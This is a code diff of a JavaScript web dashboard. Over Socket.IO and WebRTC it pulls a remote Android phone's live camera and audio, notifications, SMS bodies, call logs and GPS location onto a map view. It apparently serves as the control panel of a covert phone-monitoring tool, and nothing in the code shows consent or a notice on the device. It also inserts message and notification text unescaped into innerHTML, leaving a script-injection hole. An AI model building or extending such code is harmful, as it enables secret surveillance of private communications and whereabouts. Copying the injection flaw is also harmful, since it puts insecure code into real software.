@@ -1,295 +1,275 @@
-const socket = io('http://192.168.29.10:3000');
+const socket = io('http://<Your Server IP Address>:3000', {
+  reconnection: true,
+  reconnectionAttempts: 15,
+  reconnectionDelay: 1000,
+  reconnectionDelayMax: 5000,
+  randomizationFactor: 0.5
+});
 const videoEl = document.getElementById('remoteVideo');
-const screenEl = document.getElementById('screenVideo');
 const statusDiv = document.getElementById('status');
-const connectionStatus = document.getElementById('connection-status');
-const cameraResolution = document.getElementById('camera-resolution');
-const screenResolution = document.getElementById('screen-resolution');
-const webClientIdEl = document.getElementById('web-client-id');
-const androidClientIdEl = document.getElementById('android-client-id');
-const frameRateEl = document.getElementById('frame-rate');
-const muteAudioBtn = document.getElementById('mute-audio');
-const pauseVideoBtn = document.getElementById('pause-video');
 const notificationsDiv = document.getElementById('notifications');
-const smsDiv = document.getElementById('sms');
-const callLogsDiv = document.getElementById('call-logs');
-const screenVideoContainer = document.getElementById('screen-video-container');
+const callLogsDiv = document.getElementById('callLogs');
+const smsDiv = document.getElementById('smsMessages');
+const debugLog = document.getElementById('debugLog');
+const retryButton = document.getElementById('retryButton');
 let peer;
 let myId;
 let androidClientId;
-let videoTrackCount = 0;
-let isAudioMuted = false;
-let isVideoPaused = false;
-const smsCache = new Set();
-const callLogCache = new Set();
+let map;
+let marker;
 
 const config = {
   iceServers: [
     { urls: 'stun:stun.l.google.com:19302' },
-    {
-      urls: 'turn:openrelay.metered.ca:80',
-      username: 'openrelayproject',
-      credential: 'openrelayproject'
-    },
-    {
-      urls: 'turn:openrelay.metered.ca:443',
-      username: 'openrelayproject',
-      credential: 'openrelayproject'
-    }
+    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
   ]
 };
 
 function updateStatus(message) {
   console.log(message);
   statusDiv.textContent = message;
+  logDebug(message);
+  retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
 }
 
-function updateStreamDetails(track, type) {
-  if (track.kind === 'video') {
-    const settings = track.getSettings();
-    const resolutionEl = type === 'camera' ? cameraResolution : screenResolution;
-    resolutionEl.textContent = `${settings.width}x${settings.height}`;
-    frameRateEl.textContent = settings.frameRate || 'N/A';
-    if (type === 'screen') {
-      const [width, height] = resolutionEl.textContent.split('x').map(Number);
-      screenVideoContainer.style.width = `${Math.min(width, 960)}px`;
-      screenVideoContainer.style.maxWidth = '100%';
-      screenVideoContainer.style.height = `${Math.min(height, 540)}px`;
-      screenVideoContainer.style.maxHeight = '100%';
-      screenVideoContainer.style.aspectRatio = `${width} / ${height}`;
-    } else if (type === 'camera') {
-      const [width, height] = resolutionEl.textContent.split('x').map(Number);
-      videoEl.parentElement.style.aspectRatio = `${width} / ${height}`;
-    }
+function logDebug(message) {
+  const logEntry = document.createElement('div');
+  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+  debugLog.prepend(logEntry);
+  while (debugLog.children.length > 50) {
+    debugLog.removeChild(debugLog.lastChild);
   }
+}
+
+function addNotification(notification) {
+  const notificationEl = document.createElement('div');
+  notificationEl.className = 'notification';
+  notificationEl.innerHTML = `
+    <p><strong>App:</strong> ${notification.appName}</p>
+    <p><strong>Title:</strong> ${notification.title}</p>
+    <p><strong>Text:</strong> ${notification.text}</p>
+    <p class="timestamp">${notification.timestamp}</p>
+  `;
+  notificationsDiv.prepend(notificationEl);
+  while (notificationsDiv.children.length > 10) {
+    notificationsDiv.removeChild(notificationsDiv.lastChild);
+  }
+  logDebug(`Received notification from ${notification.appName}`);
+}
+
+function addCallLog(call) {
+  const callLogEl = document.createElement('div');
+  callLogEl.className = 'call-log';
+  callLogEl.innerHTML = `
+    <p><strong>Number:</strong> ${call.number}</p>
+    <p><strong>Type:</strong> ${call.type}</p>
+    <p><strong>Date:</strong> ${call.date}</p>
+    <p><strong>Duration:</strong> ${call.duration} seconds</p>
+  `;
+  callLogsDiv.prepend(callLogEl);
+  while (callLogsDiv.children.length > 10) {
+    callLogsDiv.removeChild(callLogsDiv.lastChild);
+  }
+  logDebug(`Received call log: ${call.number}`);
+}
+
+function addSmsMessage(sms) {
+  const smsEl = document.createElement('div');
+  smsEl.className = 'sms-message';
+  smsEl.innerHTML = `
+    <p><strong>Address:</strong> ${sms.address}</p>
+    <p><strong>Type:</strong> ${sms.type}</p>
+    <p><strong>Date:</strong> ${sms.date}</p>
+    <p><strong>Body:</strong> ${sms.body}</p>
+  `;
+  smsDiv.prepend(smsEl);
+  while (smsDiv.children.length > 50) {
+    smsDiv.removeChild(smsDiv.lastChild);
+  }
+  logDebug(`Received SMS from ${sms.address}`);
+}
+
+function initMap() {
+  map = L.map('mapContainer').setView([0, 0], 13);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+  }).addTo(map);
+}
+
+function updateMap(latitude, longitude) {
+  if (!map) {
+    initMap();
+  }
+  if (marker) {
+    marker.setLatLng([latitude, longitude]);
+  } else {
+    marker = L.marker([latitude, longitude]).addTo(map);
+    marker.bindPopup('Device Location').openPopup();
+  }
+  map.setView([latitude, longitude], 13);
+  logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
+}
+
+function reconnectSocket() {
+  updateStatus('Attempting to reconnect to server...');
+  socket.connect();
 }
 
 socket.on('connect', () => {
   updateStatus('Connected to signaling server');
-  connectionStatus.textContent = 'Connected';
+});
+
+socket.on('connect_error', (error) => {
+  const message = `Socket.IO connection error: ${error.message} (${error.type})`;
+  console.error(message);
+  updateStatus('Failed to connect to server. Retrying...');
 });
 
 socket.on('id', id => {
   myId = id;
-  console.log('My socket ID:', myId);
-  webClientIdEl.textContent = myId;
+  logDebug(`Received socket ID: ${myId}`);
   socket.emit('identify', 'web');
   socket.emit('web-client-ready', myId);
   updateStatus('Announced readiness to receive stream');
 });
 
 socket.on('android-client-ready', id => {
-  androidClientId = id;
-  console.log('Android client ready:', id);
-  androidClientIdEl.textContent = id;
-  updateStatus('Android client connected');
+  if (androidClientId !== id) {
+    androidClientId = id;
+    logDebug(`Android client ready: ${id}`);
+    updateStatus('Android client connected');
+  }
+});
+
+socket.on('notification', data => {
+  logDebug(`Received notification from ${data.from}`);
+  if (data.notification) {
+    addNotification(data.notification);
+  }
+});
+
+socket.on('call_log', data => {
+  logDebug(`Received call log from ${data.from}`);
+  if (data.call_logs) {
+    data.call_logs.forEach(call => addCallLog(call));
+  }
+});
+
+socket.on('sms', data => {
+  logDebug(`Received SMS messages from ${data.from}`);
+  if (data.sms_messages) {
+    data.sms_messages.forEach(sms => addSmsMessage(sms));
+  }
+});
+
+socket.on('location', data => {
+  logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
+  updateMap(data.latitude, data.longitude);
 });
 
 socket.on('signal', async (data) => {
-  console.log('Received signal:', JSON.stringify(data));
+  logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
   const { from, signal } = data;
 
   if (!peer) {
-    console.log('Creating new peer connection');
-    peer = new RTCPeerConnection(config);
-    peer.addTransceiver('video', { direction: 'recvonly' }); // Camera
-    peer.addTransceiver('video', { direction: 'recvonly' }); // Screen
-    peer.addTransceiver('audio', { direction: 'recvonly' });
+    logDebug('Creating new peer connection');
+    try {
+      peer = new RTCPeerConnection(config);
+      peer.addTransceiver('video', { direction: 'recvonly' });
+      peer.addTransceiver('audio', { direction: 'recvonly' });
 
-    peer.ontrack = event => {
-      console.log(`Received ${event.track.kind} track:`, {
-        id: event.track.id,
-        mid: event.transceiver?.mid,
-        label: event.track.label,
-        streamId: event.streams[0]?.id
-      });
-      const stream = event.streams[0];
-      if (event.track.kind === 'video') {
-        videoTrackCount++;
-        if (videoTrackCount === 1 || event.transceiver?.mid === '0' || event.track.label.includes('video')) {
-          if (!videoEl.srcObject) {
-            videoEl.srcObject = stream;
-            videoEl.onloadedmetadata = () => {
-              console.log('Camera video metadata loaded, attempting to play');
-              videoEl.play().catch(e => console.error('Camera play error:', e));
-              updateStatus('Playing Android camera stream');
-              document.body.style.backgroundColor = '#0f172a';
-              updateStreamDetails(event.track, 'camera');
-            };
-          }
-        } else if (videoTrackCount === 2 || event.transceiver?.mid === '2' || event.track.label.includes('screen')) {
-          if (!screenEl.srcObject) {
-            screenEl.srcObject = stream;
-            screenEl.onloadedmetadata = () => {
-              console.log('Screen video metadata loaded, attempting to play');
-              screenEl.play().catch(e => console.error('Screen play error:', e));
-              updateStatus('Playing Android screen stream');
-              document.body.style.backgroundColor = '#0f172a';
-              updateStreamDetails(event.track, 'screen');
-            };
-          }
-        } else {
-          console.warn('Unexpected video track:', {
-            mid: event.transceiver?.mid,
-            label: event.track.label,
-            count: videoTrackCount
+      peer.ontrack = ({ streams }) => {
+        const remoteStream = streams[0];
+        logDebug('Assigned remote stream to video element');
+        videoEl.srcObject = remoteStream;
+
+        videoEl.onloadedmetadata = () => {
+          videoEl.play().catch(err => {
+            console.error('Autoplay blocked:', err);
+            updateStatus('Tap the video to start playback');
+            videoEl.setAttribute('controls', 'true');
+          });
+        };
+
+        updateStatus('Receiving remote stream');
+      };
+
+      peer.onicecandidate = e => {
+        if (e.candidate) {
+          logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
+          socket.emit('signal', {
+            to: from,
+            from: myId,
+            signal: { candidate: e.candidate }
           });
         }
-      } else if (event.track.kind === 'audio') {
-        if (!videoEl.srcObject) {
-          videoEl.srcObject = stream;
-          console.log('Assigned audio to camera video element');
-          updateStatus('Playing Android audio stream');
+      };
+
+      peer.oniceconnectionstatechange = () => {
+        logDebug(`ICE connection state: ${peer.iceConnectionState}`);
+        updateStatus(`ICE connection: ${peer.iceConnectionState}`);
+        if (peer.iceConnectionState === 'failed') {
+          updateStatus('Connection failed, please refresh or retry');
         }
-      }
-    };
+      };
 
-    peer.onicecandidate = e => {
-      if (e.candidate) {
-        console.log('Sending ICE candidate:', e.candidate.sdpMid);
-        socket.emit('signal', {
-          to: from,
-          from: myId,
-          signal: { candidate: e.candidate }
-        });
-      }
-    };
-
-    peer.oniceconnectionstatechange = () => {
-      console.log('ICE connection state:', peer.iceConnectionState);
-      updateStatus(`ICE connection: ${peer.iceConnectionState}`);
-      connectionStatus.textContent = peer.iceConnectionState;
-      if (peer.iceConnectionState === 'failed') {
-        updateStatus('Connection failed, please restart');
-      }
-    };
-
-    peer.onsignalingstatechange = () => {
-      console.log('Signaling state:', peer.signalingState);
-    };
+      peer.onsignalingstatechange = () => {
+        logDebug(`Signaling state: ${peer.signalingState}`);
+      };
+    } catch (err) {
+      console.error('Failed to create peer connection:', err);
+      updateStatus(`Peer connection error: ${err.message}`);
+    }
   }
 
   try {
     if (signal.type === 'offer') {
-      console.log('Processing offer from Android, SDP:', signal.sdp);
+      logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
       await peer.setRemoteDescription(new RTCSessionDescription(signal));
       const answer = await peer.createAnswer();
-      console.log('Created answer, SDP:', answer.sdp);
+      logDebug(`Created answer, SDP: ${answer.sdp.substring(0, 50)}...`);
       await peer.setLocalDescription(answer);
-      console.log('Sending answer back to Android');
+      logDebug('Sending answer back to Android');
       socket.emit('signal', {
         to: from,
         from: myId,
         signal: { type: 'answer', sdp: answer.sdp }
       });
     } else if (signal.candidate) {
-      console.log('Adding ICE candidate:', signal.candidate.candidate);
+      logDebug(`Adding ICE candidate: ${signal.candidate.candidate}`);
       await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
     }
   } catch (err) {
     console.error('Error handling signal:', err);
-    updateStatus('Error: ' + err.message);
+    updateStatus(`Error: ${err.message}`);
   }
 });
 
 socket.on('android-client-disconnected', () => {
   updateStatus('Android client disconnected');
-  connectionStatus.textContent = 'Disconnected';
-  cameraResolution.textContent = 'N/A';
-  screenResolution.textContent = 'N/A';
-  androidClientIdEl.textContent = 'N/A';
-  frameRateEl.textContent = 'N/A';
-  screenVideoContainer.style.width = '';
-  screenVideoContainer.style.height = '';
-  screenVideoContainer.style.aspectRatio = '16 / 9';
   if (peer) {
     peer.close();
     peer = null;
     videoEl.srcObject = null;
-    screenEl.srcObject = null;
-    videoTrackCount = 0;
-    document.body.style.backgroundColor = '#0f172a';
+    document.body.style.backgroundColor = '#111827';
   }
-  notificationsDiv.innerHTML = '<p>Waiting for notifications...</p>';
-  smsDiv.innerHTML = '<p>Waiting for SMS...</p>';
-  callLogsDiv.innerHTML = '<p>Waiting for call logs...</p>';
-  smsCache.clear();
-  callLogCache.clear();
-});
-
-socket.on('connect_error', (error) => {
-  console.error('Socket.IO connect error:', error);
-  updateStatus('Signaling connection error');
-  connectionStatus.textContent = 'Disconnected';
-});
-
-socket.on('notification', (data) => {
-  console.log('Received notification:', data);
-  if (notificationsDiv.querySelector('p').textContent === 'Waiting for notifications...') {
-    notificationsDiv.innerHTML = '';
+  notificationsDiv.innerHTML = '';
+  callLogsDiv.innerHTML = '';
+  smsDiv.innerHTML = '';
+  if (marker) {
+    marker.remove();
+    marker = null;
   }
-  const notification = document.createElement('div');
-  notification.className = 'data-entry';
-  const appName = data.app.split('.').pop() || data.app;
-  notification.innerHTML = `<p><strong>${appName}</strong>: ${data.title} - ${data.text} (${new Date(data.timestamp).toLocaleTimeString()})</p>`;
-  notificationsDiv.insertBefore(notification, notificationsDiv.firstChild);
-  notificationsDiv.scrollTop = 0;
+  logDebug('Android client disconnected');
 });
 
-socket.on('sms', (data) => {
-  console.log('Received SMS:', data);
-  const key = `${data.sender}:${data.message}:${data.timestamp}`;
-  if (smsCache.has(key)) return;
-  smsCache.add(key);
-  if (smsDiv.querySelector('p').textContent === 'Waiting for SMS...') {
-    smsDiv.innerHTML = '';
-  }
-  const sms = document.createElement('div');
-  sms.className = 'data-entry';
-  sms.innerHTML = `<p><strong>${data.sender}</strong>: ${data.message} (${new Date(data.timestamp).toLocaleTimeString()})</p>`;
-  smsDiv.insertBefore(sms, smsDiv.firstChild);
-  smsDiv.scrollTop = 0;
+socket.on('error', (error) => {
+  console.error('Socket.IO server error:', error);
+  updateStatus(`Server error: ${error.message}`);
 });
 
-socket.on('call-log', (data) => {
-  console.log('Received call log:', data);
-  const key = `${data.number}:${data.type}:${data.timestamp}`;
-  if (callLogCache.has(key)) return;
-  callLogCache.add(key);
-  if (callLogsDiv.querySelector('p').textContent === 'Waiting for call logs...') {
-    callLogsDiv.innerHTML = '';
-  }
-  const call = document.createElement('div');
-  call.className = 'data-entry';
-  call.innerHTML = `<p><strong>${data.number}</strong> (${data.type}): ${new Date(data.timestamp).toLocaleTimeString()}</p>`;
-  callLogsDiv.insertBefore(call, callLogsDiv.firstChild);
-  callLogsDiv.scrollTop = 0;
-});
+retryButton.addEventListener('click', reconnectSocket);
 
-muteAudioBtn.addEventListener('click', () => {
-  if (peer && videoEl.srcObject) {
-    const audioTrack = videoEl.srcObject.getAudioTracks()[0];
-    if (audioTrack) {
-      isAudioMuted = !isAudioMuted;
-      audioTrack.enabled = !isAudioMuted;
-      muteAudioBtn.textContent = isAudioMuted ? 'Unmute Audio' : 'Mute Audio';
-      updateStatus(isAudioMuted ? 'Audio muted' : 'Audio unmuted');
-    }
-  }
-});
-
-pauseVideoBtn.addEventListener('click', () => {
-  if (peer && (videoEl.srcObject || screenEl.srcObject)) {
-    isVideoPaused = !isVideoPaused;
-    const videoTracks = [
-      ...(videoEl.srcObject?.getVideoTracks() || []),
-      ...(screenEl.srcObject?.getVideoTracks() || [])
-    ];
-    videoTracks.forEach(track => (track.enabled = !isVideoPaused));
-    pauseVideoBtn.textContent = isVideoPaused ? 'Resume Video' : 'Pause Video';
-    updateStatus(isVideoPaused ? 'Video paused' : 'Video resumed');
-  }
-});
-
-updateStatus('Waiting for Android stream...');
-console.log('Web client ready for incoming stream');
+updateStatus('Connecting to server...');
+logDebug('Web client initializing...');
+initMap();
